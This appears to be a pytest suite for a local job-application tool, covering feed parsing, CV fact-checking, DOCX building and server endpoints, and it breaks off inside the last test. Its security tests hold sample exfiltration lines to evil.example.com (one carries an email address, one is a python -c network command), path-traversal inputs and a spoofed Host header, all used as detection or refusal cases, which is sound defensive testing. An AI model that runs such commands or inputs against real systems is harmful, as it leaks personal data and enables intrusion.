"""Core tests: run with `python -m pytest tests` (or `python tests/test_core.py`).

They avoid the network and Microsoft Word: feeds are parsed from fixtures, the
CV builder is checked at DOCX level, and the server runs on a temporary home.
"""
import json
import shutil
import os
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
sys.path.insert(0, os.path.join(ROOT, "jobdesk", "cv"))

import factcheck  # noqa: E402
import ingest  # noqa: E402
import build_cv  # noqa: E402


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)
    return path


# ---------- fact check ----------

def test_factcheck_catches_invented_numbers_and_names():
    d = tempfile.mkdtemp()
    bank = write(os.path.join(d, "bank.md"), "Led a team of 6. Raised revenue by 12% at Example Pay. MBA from Example School.")
    post = write(os.path.join(d, "posting.md"), "Acme Corp is hiring a Strategy Manager in Dubai.")
    cv = write(os.path.join(d, "cv.json"), json.dumps({"summary": "Led a team of 6 and raised revenue by 12%.",
                                                        "bullets": ["Led a team of 45 at Deloitte"]}))
    note = write(os.path.join(d, "cover_note.md"), "Dear Hiring Team,\n\nI would bring my Example Pay experience to Acme Corp. I also hold a PMP.\n")
    issues = factcheck.check([bank], post, cv, [note])
    tokens = {i["token"] for i in issues}
    assert "45" in tokens and "Deloitte" in tokens and "PMP" in tokens, issues
    assert "6" not in tokens and "12" not in tokens and "Acme" not in tokens, issues


def test_factcheck_ignores_sentence_openers_and_salary_answers():
    d = tempfile.mkdtemp()
    bank = write(os.path.join(d, "bank.md"), "Worked at Example Pay for 3 years.")
    qa = write(os.path.join(d, "application_qa.md"),
               "**Monthly salary expectation**\nAED 52,000 total package, negotiable\n\n**Why us?**\nBefore that, I worked at Example Pay for 3 years.\n")
    assert factcheck.check([bank], None, None, [qa]) == []


# ---------- feeds ----------

def test_ingest_normalises_each_feed_type():
    cases = {
        "greenhouse": {"jobs": [{"title": "Strategy Manager", "location": {"name": "Dubai"}, "absolute_url": "https://x/1", "updated_at": "2026-09-01T00:00:00Z", "content": "&lt;p&gt;Hi&lt;/p&gt;"}]},
        "lever": [{"text": "Strategy Manager", "categories": {"location": "Riyadh"}, "hostedUrl": "https://x/2", "createdAt": 1788000000000, "description": "<p>Hi</p>", "lists": []}],
        "ashby": {"jobs": [{"title": "Strategy Manager", "location": "Dubai", "jobUrl": "https://x/3", "publishedAt": "2026-09-02", "descriptionHtml": "<p>Hi</p>"}]},
        "workable": {"jobs": [{"title": "Strategy Manager", "city": "Riyadh", "country": "Saudi Arabia", "url": "https://x/4", "published_on": "2026-09-03", "description": "Hi"}]},
        "smartrecruiters": {"content": [{"name": "Strategy Manager", "id": "5", "location": {"city": "Dubai", "country": "ae"}, "releasedDate": "2026-09-04"}]},
        "teamtailor": {"items": [{"title": "Strategy Manager", "location": "Dubai, United Arab Emirates", "url": "https://x/6",
                                  "pubDate": "Mon, 28 Sep 2026 10:00:00 +0000", "description": "<p>Hi</p>", "remote": False}]},
        "workday": {"postings": [{"title": "Strategy Manager", "locationsText": "Riyadh, Saudi Arabia", "externalPath": "/job/7", "postedOn": "Posted Today"}],
                    "base": "https://acme.wd1.myworkdayjobs.com/Careers"},
    }
    for ats, raw in cases.items():
        jobs = ingest.normalise({"company": "Acme", "ats": ats, "slug": "acme"}, raw)
        assert len(jobs) == 1 and jobs[0]["title"] == "Strategy Manager" and jobs[0]["url"], (ats, jobs)
        assert jobs[0]["location"], (ats, jobs)


def test_ingest_filters_location_title_and_level():
    f = {"locations": ["dubai"], "title_include": ["strategy"], "title_exclude": ["intern"], "level_exclude": [r"\bdirector\b"]}
    ok = {"title": "Strategy Manager", "location": "Dubai, UAE"}
    assert ingest.matches(ok, f)
    assert not ingest.matches({"title": "Strategy Intern", "location": "Dubai"}, f)
    assert not ingest.matches({"title": "Director of Strategy", "location": "Dubai"}, f)
    assert not ingest.matches({"title": "Strategy Manager", "location": "Cairo"}, f)


# ---------- CV builder ----------

def test_build_cv_docx_has_content_and_clean_properties():
    import docx
    spec = json.load(open(os.path.join(ROOT, "profile.example", "cv_spec.json"), encoding="utf-8"))
    out = os.path.join(tempfile.mkdtemp(), "cv.docx")
    build_cv.build_docx(spec, out)
    d = docx.Document(out)
    text = "\n".join(p.text for p in d.paragraphs)
    assert build_cv.display_name(spec["name"], build_cv.style_of(spec)) in text and "PROFESSIONAL EXPERIENCE" in text.upper()
    for job in spec["experience"]:
        for role in job["roles"]:
            for b in role["bullets"]:
                assert b in text
    cp = d.core_properties
    assert cp.author == spec["name"] and cp.last_modified_by == spec["name"] and cp.title == spec["name"] + " - CV"
    assert not cp.comments and not cp.keywords


# ---------- server ----------

def _free_port():
    s = socket.socket(); s.bind(("127.0.0.1", 0)); p = s.getsockname()[1]; s.close(); return p


def test_server_api_roundtrip():
    home = tempfile.mkdtemp()
    write(os.path.join(home, "state", "decisions.json"), "{}")
    folder = "2026-09-29/01-acme"
    write(os.path.join(home, "daily", "2026-09-29", "picks.json"), json.dumps({"run": {"summary": "t"}, "jobs": [
        {"id": "2026-09-29-01-acme", "date": "2026-09-29", "company": "Acme", "role": "Strategy Manager", "folder": folder, "status": "new"}]}))
    write(os.path.join(home, "daily", folder, "pack.json"), json.dumps({"cv_file": folder + "/cv.pdf", "cover_note": "hi", "qa": []}))
    write(os.path.join(home, "daily", folder, "cv.pdf"), "%PDF-1.4 test")
    port = _free_port()
    env = dict(os.environ, JOB_DESK_HOME=home, JOB_DESK_PORT=str(port), JOB_DESK_NO_AGENTS="1")
    srv = subprocess.Popen([sys.executable, os.path.join(ROOT, "jobdesk", "server.py")], env=env)
    try:
        base = f"http://127.0.0.1:{port}"
        for _ in range(40):
            try:
                urllib.request.urlopen(base + "/api/jobs", timeout=1); break
            except Exception:
                time.sleep(0.25)
        jobs = json.load(urllib.request.urlopen(base + "/api/jobs"))["jobs"]
        assert jobs[0]["pack"] == "ready" and jobs[0]["cover_note"] == "hi"
        assert urllib.request.urlopen(base + "/files/" + folder + "/cv.pdf").status == 200

        def post(path, body, header=True):
            h = {"Content-Type": "application/json"}
            if header:
                h["X-JobDesk"] = "1"
            return urllib.request.urlopen(urllib.request.Request(base + path, data=json.dumps(body).encode(), headers=h, method="POST"))

        assert post("/api/decision", {"id": "2026-09-29-01-acme", "status": "skipped", "skip_reasons": ["Pay too low", "Location"], "skip_note": "Jeddah only"}).status == 200
        sk = json.load(open(os.path.join(home, "state", "decisions.json"), encoding="utf-8"))["2026-09-29-01-acme"]
        assert sk["skip_reasons"] == ["Pay too low", "Location"] and sk["skip_note"] == "Jeddah only"
        assert sk["skip_reason"] == "Pay too low; Location; Jeddah only"
        assert post("/api/note", {"id": "2026-09-29-01-acme", "note": "Referral: Jane at Acme"}).status == 200
        assert post("/api/decision", {"id": "2026-09-29-01-acme", "status": "submitted"}).status == 200
        assert post("/api/decision", {"id": "2026-09-29-01-acme", "status": "interview"}).status == 200
        dec = json.load(open(os.path.join(home, "state", "decisions.json"), encoding="utf-8"))["2026-09-29-01-acme"]
        assert dec["status"] == "interview" and dec["submitted_at"]
        assert dec["note"] == "Referral: Jane at Acme"  # notes survive status changes
        job = json.load(urllib.request.urlopen(base + "/api/jobs"))["jobs"][0]
        assert job.get("prep") == "queued"  # marking an interview queues the prep pack
        for path, body, header in (("/api/decision", {"id": "2026-09-29-01-acme", "status": "hired"}, True),
                                   ("/api/decision", {"id": "2026-09-29-01-acme", "status": "apply"}, False)):
            try:
                post(path, body, header); assert False, "should be refused"
            except urllib.error.HTTPError as e:
                assert e.code in (400, 403)
        try:
            urllib.request.urlopen(base + "/files/../state/decisions.json"); assert False
        except urllib.error.HTTPError as e:
            assert e.code == 404
        write(os.path.join(home, "profile", "criteria.md"), "# old criteria")
        files = json.load(urllib.request.urlopen(base + "/api/profile"))["files"]
        assert any(f["name"] == "criteria.md" and f["text"] == "# old criteria" for f in files)
        assert post("/api/profile", {"name": "criteria.md", "text": "# new criteria"}).status == 200
        assert open(os.path.join(home, "profile", "criteria.md"), encoding="utf-8").read() == "# new criteria"
        assert open(os.path.join(home, "profile", "criteria.md.bak"), encoding="utf-8").read() == "# old criteria"
        for bad in ({"name": "../config.json", "text": "{}"}, {"name": "boards.json", "text": "{not json"}):
            try:
                post("/api/profile", bad); assert False, bad
            except urllib.error.HTTPError as e:
                assert e.code == 400
        write(os.path.join(home, "logs", "2026-09-29.log"), "=== started 2026-09-29T07:00:00 ===\nreport\n=== finished 2026-09-29T07:09:00, exit 1 ===\n")
        rs = json.load(urllib.request.urlopen(base + "/api/runstatus"))["run"]
        assert rs["state"] == "failed" and rs["exit"] == 1 and rs["log"] == "2026-09-29.log", rs
        write(os.path.join(home, "state", "ingested", "2026-09-29.json"), json.dumps({"jobs": [
            {"n": 1, "company": "Feedco", "title": "Strategy Lead", "location": "Dubai", "url": "https://x/feed1", "posted": "2026-09-28", "description": "Full text"},
            {"n": 2, "company": "Acme", "title": "Strategy Manager (REF-123)", "location": "Riyadh", "url": "https://acme.careers/2", "posted": "2026-09-28"}]}))
        fd = json.load(urllib.request.urlopen(base + "/api/feed"))
        assert fd["day"] == "2026-09-29" and fd["jobs"][0]["title"] == "Strategy Lead"
        assert post("/api/feed/pick", {"day": "2026-09-29", "n": 1}).status == 200
        jobs = json.load(urllib.request.urlopen(base + "/api/jobs"))["jobs"]
        added = [j for j in jobs if j.get("tag") == "Feed"]
        assert len(added) == 1 and added[0]["folder"].startswith("2026-09-29-feed/")
        assert os.path.isfile(os.path.join(home, "daily", *added[0]["folder"].split("/"), "posting.md"))
        assert json.load(urllib.request.urlopen(base + "/api/feed"))["jobs"] == []   # no longer offered
        cfg = {"owner": "T", "allowed_hosts": ["pc.tailnet.ts.net"]}
        write(os.path.join(home, "config.json"), json.dumps(cfg))
        ok = urllib.request.urlopen(urllib.request.Request(base + "/api/jobs", headers={"Host": "pc.tailnet.ts.net"}))
        assert ok.status == 200  # an explicitly allowed private name works
        try:  # a page reached through a rebound DNS name must be refused
            urllib.request.urlopen(urllib.request.Request(base + "/api/jobs", headers={"Host": "evil.example:%d" % port})); assert False
        except urllib.error.HTTPError as e:
            assert e.code == 403
    finally:
        srv.terminate()


# ---------- CLI ----------

def test_cli_setup_and_validation():
    home = os.path.join(tempfile.mkdtemp(), "home")
    cli = os.path.join(ROOT, "jobdesk", "cli.py")
    r = subprocess.run([sys.executable, cli, "setup", "--home", home, "--owner", "Test User", "--no-shortcut"], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    for f in ("cv_spec.json", "fact_bank.md", "criteria.md", "application_answers.md", "boards.json"):
        assert os.path.isfile(os.path.join(home, "profile", f)), f
    assert json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))["owner"] == "Test User"
    bad = subprocess.run([sys.executable, cli, "tailor", "--home", home, "--folder", "../../etc"], capture_output=True, text=True)
    assert bad.returncode != 0 and "Bad folder" in (bad.stderr + bad.stdout)
    prot = subprocess.run([sys.executable, cli, "setup", "--home", os.path.join(tempfile.mkdtemp(), ".claude", "x"), "--owner", "T", "--no-shortcut"], capture_output=True, text=True)
    assert prot.returncode != 0


def test_cli_stats_funnel():
    home = os.path.join(tempfile.mkdtemp(), "home")
    cli = os.path.join(ROOT, "jobdesk", "cli.py")
    subprocess.run([sys.executable, cli, "setup", "--home", home, "--owner", "T", "--no-shortcut"], capture_output=True)
    jobs = [{"id": f"2026-09-2{i}-0{i}-x", "date": f"2026-09-2{i}", "track": "Tech", "folder": f"2026-09-2{i}/0{i}-x"} for i in range(1, 6)]
    write(os.path.join(home, "daily", "2026-09-21", "picks.json"), json.dumps({"jobs": jobs}))
    write(os.path.join(home, "state", "decisions.json"), json.dumps({
        jobs[0]["id"]: {"status": "submitted"}, jobs[1]["id"]: {"status": "interview"},
        jobs[2]["id"]: {"status": "skipped", "skip_reason": "Pay too low; Location", "skip_reasons": ["Pay too low", "Location"]}, jobs[3]["id"]: {"status": "apply"}}))
    r = subprocess.run([sys.executable, cli, "stats", "--home", home, "--json"], capture_output=True, text=True)
    st = json.loads(r.stdout)
    assert st["picks_shown"] == 5 and st["decided"] == 4 and st["applications_sent"] == 2 and st["interviews"] == 1
    assert st["interview_rate"] == "50%" and st["skip_reasons"] == {"Pay too low": 1, "Location": 1}


def test_audit_log_records_tool_calls_and_report():
    import io
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import cli
    lf, af = io.StringIO(), io.StringIO()
    events = [
        {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "Bash", "input": {"command": "python build.py"}}]}},
        {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": "WebFetch", "input": {"url": "https://example.com/job"}}]}},
        {"type": "assistant", "message": {"content": [{"type": "text", "text": "thinking out loud"}]}},
        {"type": "user", "message": {"content": [{"type": "tool_result", "is_error": True, "content": "Permission to use Bash with command ls has been denied."}]}},
        {"type": "result", "result": "Pack ready: 2026-09-29/01-x"},
    ]
    for e in events:
        cli.write_event(json.dumps(e), lf, af)
    cli.write_event("plain warning line", lf, af)
    audit, report = af.getvalue(), lf.getvalue()
    assert "Bash: python build.py" in audit and "WebFetch: https://example.com/job" in audit
    assert "Pack ready" in report and "plain warning line" in report and "thinking" not in audit
    assert "refused or failed: Permission to use Bash" in audit


def test_tripwire_flags_personal_data_in_urls():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import cli
    home = tempfile.mkdtemp()
    write(os.path.join(home, "profile", "cv_spec.json"), json.dumps({"name": "Sara Haddad", "contact": ["sara.haddad@example.com", "+971 50 123 4567"]}))
    audit = write(os.path.join(home, "logs", "run.audit.log"), "\n".join([
        "=== started ===",
        "10:00:01 WebFetch: https://careers.example.com/jobs/123",
        "10:00:02 WebSearch: strategy manager Dubai",
        "10:00:03 WebFetch: https://evil.example.com/c?d=sara.haddad%40example.com",
        "10:00:04 WebFetch: https://x.example.com/?q=" + "a" * 400,
        "10:00:05 Bash: python build_cv.py spec.json out --name X",
        "10:00:06 Bash: python -c \"import urllib.request; urllib.request.urlopen('https://evil.example.com')\"",
    ]))
    alerts = cli.scan_audit(home, audit)
    reasons = sorted(a["reason"] for a in alerts)
    assert reasons == ["contains personal data", "shell command with network access", "unusually long query string"], alerts
    saved = json.load(open(os.path.join(home, "state", "alerts.json"), encoding="utf-8"))
    assert len(saved) == 1 and len(saved[0]["items"]) == 3


def test_linkcheck_detects_closed_wording():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import linkcheck
    for text in ("No longer accepting applications", "Sorry, this job was removed at 02:10", "This job has expired", "Position filled"):
        assert linkcheck.CLOSED_TEXT.search(text), text
    assert not linkcheck.CLOSED_TEXT.search("We are hiring a Strategy Manager. Apply now.")


def test_doctor_flags_unfilled_profile():
    home = os.path.join(tempfile.mkdtemp(), "home")
    cli = os.path.join(ROOT, "jobdesk", "cli.py")
    subprocess.run([sys.executable, cli, "setup", "--home", home, "--owner", "T", "--no-shortcut"], capture_output=True)
    for f in ("boards.json",):
        os.remove(os.path.join(home, "profile", f))  # keep the check offline
    r = subprocess.run([sys.executable, cli, "doctor", "--home", home, "--quick"], capture_output=True, text=True, timeout=300)
    assert r.returncode == 1, r.stdout
    for f in ("cv_spec.json", "fact_bank.md", "criteria.md", "application_answers.md"):
        assert f"FIX  profile/{f}" in r.stdout, (f, r.stdout)


def test_export_to_excel():
    import openpyxl
    home = os.path.join(tempfile.mkdtemp(), "home")
    cli = os.path.join(ROOT, "jobdesk", "cli.py")
    subprocess.run([sys.executable, cli, "setup", "--home", home, "--owner", "T", "--no-shortcut"], capture_output=True)
    write(os.path.join(home, "daily", "2026-09-21", "picks.json"), json.dumps({"jobs": [
        {"id": "a", "date": "2026-09-21", "company": "Acme", "role": "Strategy Manager", "url": "https://example.com/a"},
        {"id": "b", "date": "2026-09-21", "company": "Beta", "role": "Ops Lead", "url": "https://example.com/b"}]}))
    write(os.path.join(home, "state", "decisions.json"), json.dumps({"a": {"status": "interview", "submitted_at": "2026-09-22T10:00:00"}}))
    out = os.path.join(home, "export.xlsx")
    r = subprocess.run([sys.executable, cli, "export", "--home", home, "--out", out], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    wb = openpyxl.load_workbook(out)
    rows = list(wb["Applications"].iter_rows(min_row=2, values_only=True))
    assert len(rows) == 2 and rows[0][1] == "Acme" and rows[0][8] == "interview" and rows[0][10] == "2026-09-22"
    funnel = dict(wb["Funnel"].iter_rows(values_only=True))
    assert funnel["Applications sent"] == 1 and funnel["Interviews"] == 1


def test_postings_index_tracks_first_seen_and_closure():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import postings_index as pi
    home = tempfile.mkdtemp()
    board = {"company": "Acme", "ats": "ashby", "slug": "acme"}
    a = {"url": "https://x/a", "title": "Strategy Manager", "company": "Acme", "ats": "ashby"}
    b = {"url": "https://x/b", "title": "Ops Lead", "company": "Acme", "ats": "ashby"}
    assert pi.record_run(home, board, [a, b], today="2026-09-28") == 0
    assert pi.record_run(home, board, [a], today="2026-09-29") == 1          # b left the feed
    assert pi.closed_urls(home) == {"https://x/b": "2026-09-29"}
    assert pi.stats(home) == {"postings": 2, "open": 1, "closed": 1}
    assert [r["url"] for r in pi.new_since(home, "2026-09-28")] == ["https://x/a"]
    pi.record_run(home, board, [a, b], today="2026-09-30")                   # b reposted: reopened
    assert pi.closed_urls(home) == {}


def test_unix_launcher_content(monkeypatch=None):
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import cli
    import platform as _p
    fake_home = tempfile.mkdtemp()
    old_expand, old_system = os.path.expanduser, _p.system
    try:
        os.path.expanduser = lambda pth: pth.replace("~", fake_home)
        for system, name in (("Darwin", "Job Desk.command"), ("Linux", "job-desk.desktop")):
            cli.platform.system = lambda s=system: s
            path = cli.make_unix_launcher(os.path.join(fake_home, "JobDesk"))
            assert os.path.basename(path) == name
            body = open(path, encoding="utf-8").read()
            assert "cli.py" in body and " start --home " in body
    finally:
        os.path.expanduser, cli.platform.system = old_expand, old_system


def test_cover_letter_docx():
    import docx as _docx
    sys.path.insert(0, os.path.join(ROOT, "jobdesk", "cv"))
    import build_cover
    out = os.path.join(tempfile.mkdtemp(), "letter.docx")
    note = "Dear Hiring Team,\n\nI am applying for the **Strategy Manager** role.\n\nSecond paragraph.\n\nSara Haddad\n"
    build_cover.build(note, out, "Sara Haddad", "Dubai | sara@example.com", "Acme")
    d = _docx.Document(out)
    text = [p.text for p in d.paragraphs if p.text]
    assert text[0] == "Sara Haddad" and "Hiring Team, Acme" in text and "I am applying for the Strategy Manager role." in text
    assert d.core_properties.author == "Sara Haddad" and d.core_properties.title == "Sara Haddad - Cover letter"


def test_setup_wizard_flow():
    import base64
    home = tempfile.mkdtemp()
    write(os.path.join(home, "config.json"), json.dumps({"owner": "", "port": 0}))
    port = _free_port()
    env = dict(os.environ, JOB_DESK_HOME=home, JOB_DESK_PORT=str(port), JOB_DESK_NO_AGENTS="1")
    srv = subprocess.Popen([sys.executable, os.path.join(ROOT, "jobdesk", "server.py")], env=env)
    base = f"http://127.0.0.1:{port}"
    try:
        for _ in range(40):
            try:
                urllib.request.urlopen(base + "/api/setup/state", timeout=1); break
            except Exception:
                time.sleep(0.25)

        def post(step, body):
            req = urllib.request.Request(base + "/api/setup/" + step, data=json.dumps(body).encode(),
                                         headers={"Content-Type": "application/json", "X-JobDesk": "1"}, method="POST")
            try:
                return urllib.request.urlopen(req).status, None
            except urllib.error.HTTPError as e:
                return e.code, json.load(e).get("error")

        assert "Set up Job Desk" in urllib.request.urlopen(base + "/").read().decode()   # new user sees the wizard
        assert post("name", {"name": " "})[0] == 400
        assert post("name", {"name": "Sara Haddad"})[0] == 200
        assert post("cv", {"filename": "cv.exe", "data": base64.b64encode(b"x").decode()})[0] == 400
        assert post("cv", {"filename": "My CV.pdf", "data": "data:application/pdf;base64," + base64.b64encode(b"%PDF-1.4 x").decode()})[0] == 200
        assert post("onboard", {})[0] == 400                      # goals missing
        assert post("goals", {"roles": "", "cities": "Dubai"})[0] == 400
        assert post("goals", {"roles": "product manager", "cities": "Dubai, remote", "pay": "25k AED"})[0] == 200
        assert post("onboard", {})[0] == 200
        st = json.load(urllib.request.urlopen(base + "/api/setup/state"))
        assert st["name"] == "Sara Haddad" and st["has_cv"] and st["tasks"]["onboard"]["state"] == "queued"
        feeds = json.load(urllib.request.urlopen(base + "/api/setup/feeds"))["feeds"]
        assert post("boards", {"slugs": [feeds[0]["slug"], "not-a-real-feed"]})[0] == 200
        boards = json.load(open(os.path.join(home, "profile", "boards.json"), encoding="utf-8"))
        assert len(boards["boards"]) == 1 and "dubai" in boards["filters"]["locations"] and "remote" in boards["filters"]["locations"]
        assert post("nonsense", {})[0] == 404
        assert post("finish", {})[0] == 200
        assert "Set up Job Desk" not in urllib.request.urlopen(base + "/").read().decode()  # then the main page
        assert "Set up Job Desk" in urllib.request.urlopen(base + "/setup").read().decode()   # setup stays reachable
    finally:
        srv.terminate()


def test_browser_pdf_html_has_every_bullet():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk", "cv"))
    import build_cv
    spec = json.load(open(os.path.join(ROOT, "profile.example", "cv_spec.json"), encoding="utf-8"))
    html = build_cv.render_html(spec)
    assert spec["name"] in html and "<title>" in html
    for job in spec["experience"]:
        for role in job["roles"]:
            for b in role["bullets"]:
                assert build_cv._esc(b) in html


def test_schedule_xml_runs_late_and_on_battery():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import setup_wizard
    import xml.etree.ElementTree as ET
    xml = setup_wizard.schedule_xml(r"C:\\A & B\\pythonw.exe", r"C:\\app\\app.py", r"C:\\Users\\x\\Job Desk", "08:30")
    ns = {"t": "http://schemas.microsoft.com/windows/2004/02/mit/task"}
    root = ET.fromstring(xml.split("?>", 1)[1])
    assert root.find(".//t:StartWhenAvailable", ns).text == "true"
    assert root.find(".//t:DisallowStartIfOnBatteries", ns).text == "false"
    assert root.find(".//t:StartBoundary", ns).text.endswith("T08:30:00")
    assert root.find(".//t:Command", ns).text == r"C:\\A & B\\pythonw.exe"
    assert "--search" in root.find(".//t:Arguments", ns).text


def test_page_sends_safety_headers():
    home = tempfile.mkdtemp()
    write(os.path.join(home, "config.json"), json.dumps({"owner": "", "port": 0}))
    port = _free_port()
    env = dict(os.environ, JOB_DESK_HOME=home, JOB_DESK_PORT=str(port), JOB_DESK_NO_AGENTS="1")
    srv = subprocess.Popen([sys.executable, os.path.join(ROOT, "jobdesk", "server.py")], env=env)
    try:
        for _ in range(40):
            try:
                r = urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=1); break
            except Exception:
                time.sleep(0.25)
        assert r.headers["X-Frame-Options"] == "SAMEORIGIN" and r.headers["X-Content-Type-Options"] == "nosniff"
    finally:
        srv.terminate()


def test_settings_account_endpoints():
    home = tempfile.mkdtemp()
    write(os.path.join(home, "config.json"), json.dumps({"owner": "Sara Haddad", "port": 0, "setup_done": True, "check_updates": False}))
    write(os.path.join(home, "profile", "criteria.md"), "# criteria")
    port = _free_port()
    env = dict(os.environ, JOB_DESK_HOME=home, JOB_DESK_PORT=str(port), JOB_DESK_NO_AGENTS="1")
    srv = subprocess.Popen([sys.executable, os.path.join(ROOT, "jobdesk", "server.py")], env=env)
    base = f"http://127.0.0.1:{port}"
    try:
        for _ in range(40):
            try:
                urllib.request.urlopen(base + "/api/whoami", timeout=1); break
            except Exception:
                time.sleep(0.25)
        sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
        import setup_wizard
        assert json.load(urllib.request.urlopen(base + "/api/whoami"))["id"] == setup_wizard.home_id(home)
        upd = json.load(urllib.request.urlopen(base + "/api/update"))
        assert upd["disabled"] and not upd["available"] and upd["current"]

        def post(step, body):
            req = urllib.request.Request(base + "/api/setup/" + step, data=json.dumps(body).encode(),
                                         headers={"Content-Type": "application/json", "X-JobDesk": "1"}, method="POST")
            try:
                return urllib.request.urlopen(req).status
            except urllib.error.HTTPError as e:
                return e.code

        assert post("reset", {}) == 400                       # needs an explicit confirm
        assert post("logout", {}) == 200                      # test mode: no real sign-out
        assert post("reset", {"confirm": True}) == 200
        archived = os.listdir(os.path.join(home, "_archive"))
        assert len(archived) == 1 and os.path.isfile(os.path.join(home, "_archive", archived[0], "profile", "criteria.md"))
        cfg = json.load(open(os.path.join(home, "config.json"), encoding="utf-8"))
        assert cfg["owner"] == "" and not cfg.get("setup_done") and cfg["port"] == 0
        assert "Set up Job Desk" in urllib.request.urlopen(base + "/").read().decode()   # back to the wizard
    finally:
        srv.terminate()


def test_update_version_compare():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk"))
    import updater
    assert updater.newer("0.8.0", "0.7.1") and updater.newer("1.0.0", "0.9.9")
    assert not updater.newer("0.7.1", "0.7.1") and not updater.newer("0.7.0", "0.7.1")
    assert not updater.newer("9.9.9", "dev") and not updater.newer("9.9.9", "0.0.0-dev.4")
    assert not updater._trusted("https://evil.example/JobDesk-Setup.exe")
    assert updater._trusted(f"https://github.com/{updater.REPO}/releases/download/v0.8.0/JobDesk-Setup.exe")


def test_classic_cv_style():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk", "cv"))
    import build_cv
    import docx
    st = build_cv.style_of({})
    assert build_cv.display_name("Sara Haddad", st) == "Sara HADDAD"
    assert build_cv.display_name("Sara Haddad", build_cv.style_of({"style": {"surname_caps": False}})) == "Sara Haddad"
    spec = json.load(open(os.path.join(ROOT, "profile.example", "cv_spec.json"), encoding="utf-8"))
    out = os.path.join(tempfile.mkdtemp(), "cv.docx")
    build_cv.build_docx(spec, out)
    d = docx.Document(out)
    assert "\uf0a7" in d.part.numbering_part.element.xml          # square bullets
    assert any("CAEDFB" in p._p.xml for p in d.paragraphs)        # employer bars
    assert round(d.sections[0].left_margin.cm, 2) == 0.76


def _sample_photo(path):
    import pymupdf
    pix = pymupdf.Pixmap(pymupdf.csRGB, pymupdf.IRect(0, 0, 240, 300), False)
    pix.set_rect(pix.irect, (120, 140, 160))
    pix.save(path)


def test_cv_tools_look_text_and_images():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk", "cv"))
    import cv_tools
    import pymupdf
    d = tempfile.mkdtemp()
    photo = os.path.join(d, "face.png"); _sample_photo(photo)
    pdf = os.path.join(d, "cv.pdf")
    doc = pymupdf.open(); page = doc.new_page()
    page.insert_text((72, 72), "Sara Haddad - Product Manager")
    page.insert_image(pymupdf.Rect(400, 40, 520, 190), filename=photo)
    doc.save(pdf)
    out = os.path.join(d, "look")
    assert cv_tools.look(pdf, out) == 0
    assert os.path.isfile(os.path.join(out, "page-1.png"))
    assert any(n.startswith("image-") for n in os.listdir(out))          # the photo was extracted
    html = os.path.join(d, "cv.html")
    write(html, "<html><head><style>p{}</style></head><body><h1>Sara &amp; Co</h1><ul><li>Led 6 people</li></ul><img src='face.png'></body></html>")
    inlined = cv_tools._inline_images(open(html, encoding="utf-8").read(), [d, None])
    assert "data:image/png;base64," in inlined
    txt = os.path.join(d, "cv.txt")
    cv_tools.text_of(html, txt)
    t = open(txt, encoding="utf-8").read()
    assert "Sara & Co" in t and "Led 6 people" in t and "p{}" not in t


def test_jobdesk_design_with_photo():
    sys.path.insert(0, os.path.join(ROOT, "jobdesk", "cv"))
    import build_cv
    import docx
    d = tempfile.mkdtemp()
    os.makedirs(os.path.join(d, "design"))
    _sample_photo(os.path.join(d, "design", "photo.png"))
    spec = json.load(open(os.path.join(ROOT, "profile.example", "cv_spec.json"), encoding="utf-8"))
    spec.update(photo="design/photo.png", _dir=d)
    out = os.path.join(d, "cv.docx")
    build_cv.build_docx(spec, out)
    assert len(docx.Document(out).inline_shapes) == 1
    assert "data:image/png;base64," in build_cv.render_html(spec)
    spec["photo"] = "design/missing.png"                                  # a missing photo is simply left out
    assert "data:image" not in build_cv.render_html(spec)


def test_design_choice_endpoints():
    home = tempfile.mkdtemp()
    write(os.path.join(home, "config.json"), json.dumps({"owner": "Sara Haddad", "port": 0, "setup_done": True}))
    os.makedirs(os.path.join(home, "profile"))
    for f in ("cv_spec.json", "fact_bank.md", "criteria.md", "application_answers.md"):
        shutil.copy(os.path.join(ROOT, "profile.example", f), os.path.join(home, "profile", f))
    write(os.path.join(home, "profile", "cv_review.json"), json.dumps({"verdict": "Clear CV.", "strengths": ["Results"], "issues": [{"issue": "Two columns", "fix": "Use one"}], "recommendation": "improve", "why": "Looks good", "pages": 2, "has_photo": True}))
    os.makedirs(os.path.join(home, "profile", "design")); _sample_photo(os.path.join(home, "profile", "design", "photo.png"))
    os.makedirs(os.path.join(home, "profile", "_look")); _sample_photo(os.path.join(home, "profile", "_look", "page-1.png"))
    port = _free_port()
    env = dict(os.environ, JOB_DESK_HOME=home, JOB_DESK_PORT=str(port), JOB_DESK_NO_AGENTS="1")
    srv = subprocess.Popen([sys.executable, os.path.join(ROOT, "jobdesk", "server.py")], env=env)
    base = f"http://127.0.0.1:{port}"
    try:
        for _ in range(40):
            try:
                urllib.request.urlopen(base + "/api/whoami", timeout=1); break
            except Exception:
                time.sleep(0.25)

        def post(body):
            req = urllib.request.Request(base + "/api/setup/design", data=json.dumps(body).encode(),
                                         headers={"Content-Type": "application/json", "X-JobDesk": "1"}, method="POST")
            try:
                return urllib.request.urlopen(req).status
            except urllib.error.HTTPError as e:
                return e.code

        st = json.load(urllib.request.urlopen(base + "/api/setup/state"))
        assert st["review"]["recommendation"] == "improve" and st["has_photo"] and st["has_look"] and st["design"] is None
        assert urllib.request.urlopen(base + "/api/setup/photo").headers["Content-Type"] == "image/png"
        assert urllib.request.urlopen(base + "/api/setup/look/1").status == 200
        try:
            urllib.request.urlopen(base + "/api/setup/look/2"); assert False
